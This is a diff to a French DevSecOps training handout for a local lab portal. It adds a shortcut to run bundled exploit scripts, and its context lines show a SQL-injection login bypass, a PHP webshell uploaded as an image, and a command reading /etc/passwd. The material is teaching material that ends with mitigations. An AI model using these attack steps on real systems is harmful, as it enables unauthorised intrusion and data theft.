@@ -46,6 +46,15 @@ ul.clean{padding-left:20px}footer.doc{text-align:center;color:#8a8f98;font-size:
 <pre><code>http://localhost:8080</code></pre>
 <p>Outils : un navigateur, et <code>curl</code> (ou Burp Suite). C'est le portail interne « CorpLab ». Vous n'avez aucun compte.</p>
 
+<div class="note"><strong>🚀 Raccourci - voir la compromission tout de suite</strong>
+<p>Pour enchaîner toute l'attaque (SQLi → upload du webshell → exécution) et voir le résultat, depuis le dossier <code>intro/</code> :</p>
+<pre><code># Linux / macOS / Git Bash
+./exploit.sh
+# Windows (PowerShell)
+.\exploit.ps1</code></pre>
+<p>Tu dois voir <code>uid=33(www-data)…</code> : tu exécutes des commandes sur le serveur. Les étapes ci-dessous détaillent, à la main, ce que ce script a fait.</p>
+</div>
+
 <div class="step">
 <h3>Étape 1 — Entrer sans mot de passe (injection SQL)</h3>
 <p>Le formulaire de login colle vos saisies directement dans une requête SQL :</p>
@@ -81,7 +90,7 @@ curl -i -c c.txt --data-urlencode "username=admin'-- -" --data-urlencode "passwo
 # puis uploader le webshell en se faisant passer pour une image :
 curl -b c.txt -F "image=@shell.php;type=image/png" http://localhost:8080/admin.php
 # -&gt; "Visuel enregistré : uploads/shell.php"</code></pre>
-<div class="note"><strong>Avec Burp Suite</strong> (ou sous Windows) : uploadez une vraie image via le formulaire, interceptez la requête, remplacez le nom par <code>shell.php</code>, le contenu par le code PHP, et laissez/forcez <code>Content-Type: image/png</code>. Même résultat.</div>
+<div class="note"><strong>Sous Windows</strong>, le <code>curl</code> intégré a un bug sur l'upload de fichier (<code>-F</code>) : utilise <code>.\exploit.ps1</code> (fourni), ou <strong>Burp Suite</strong> - uploade une vraie image via le formulaire, intercepte la requête, remplace le nom par <code>shell.php</code>, le contenu par le code PHP, et force <code>Content-Type: image/png</code>. Même résultat.</div>
 <div class="livrable"><strong>Q3.</strong> Le filtre « n'autorise que les images » : pourquoi est-il inutile ? Qui contrôle le <code>Content-Type</code> ?</div>
 </div>
 
@@ -101,6 +110,13 @@ curl "http://localhost:8080/uploads/shell.php?cmd=cat%20/etc/passwd"</code></pre
 <p>En quatre étapes, à partir d'un champ de connexion, vous avez : contourné l'authentification, volé toutes les données d'accès, déposé du code sur le serveur et exécuté des commandes arbitraires. <strong>C'est ça, « compromettre une application ».</strong> Une seule faille suffit rarement : ici elles se <strong>chaînent</strong>, chacune amplifiant la précédente.</p>
 
 <div class="note"><strong>Et on évite ça comment ?</strong> C'est tout l'objet du cours qui suit : requêtes préparées (SQLi), hachage des mots de passe, validation du <em>contenu</em> des fichiers + interdiction d'exécution dans les dossiers d'upload, et surtout une <strong>chaîne CI/CD</strong> qui attrape ces fautes avant la mise en production.</p></div>
+
+<div class="step"><strong>➡️ Passer à la suite (TP 1 à 8).</strong>
+<p>L'intro était une appli à part (dossier <code>intro/</code>). Les TP 1 à 8 se font sur <strong>une seule et même application, DevSecShop</strong>, à la <strong>racine</strong> du dépôt. Reviens à la racine et lance-la :</p>
+<pre><code>cd ..
+docker compose up --build -d      # DevSecShop -> http://localhost:3000</code></pre>
+<p>Puis ouvre <code>enonces/index.html</code> et suis les TP dans l'ordre. Contrairement à l'intro, tu ne relances pas un conteneur par TP : c'est la même app que tu attaques puis corriges, étape par étape (elle se durcit TP après TP).</p>
+</div>
 
 <footer class="doc">Formation CI/CD &amp; DevSecOps · Résistez aux hackeurs · Intro — énoncé étudiant</footer>
 </div></body></html>
